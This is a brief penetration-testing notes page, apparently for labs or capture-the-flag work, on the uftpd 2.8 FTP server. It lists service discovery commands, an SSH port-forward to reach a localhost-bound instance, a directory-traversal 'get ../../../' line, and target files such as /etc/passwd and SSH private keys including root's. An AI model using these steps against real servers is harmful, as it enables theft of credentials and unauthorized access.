# uftpd

`uftpd` is a lightweight FTP server. Version 2.8 has public directory traversal / chroot bypass tooling that can be useful when the service is bound only to localhost or exposed on an unusual port.
https://www.exploit-db.com/exploits/51000
## Discovery

```bash
ss -tulpn | grep -i ftp
netstat -antp | grep LISTEN
nmap -sV -p 2121 TARGET
```

If the service is local-only, forward it:

```bash
ssh USER@TARGET -L 2121:127.0.0.1:2121
get ../../../home/user/.ssh/id_rsa
```

## Directory Traversal / Chroot Bypass

Use public `uftpd` traversal tooling to read files outside the FTP root. Good first targets:

```text
/etc/passwd
/home/USER/.ssh/id_rsa
/home/USER/.ssh/id_ed25519
/root/.ssh/id_rsa
```


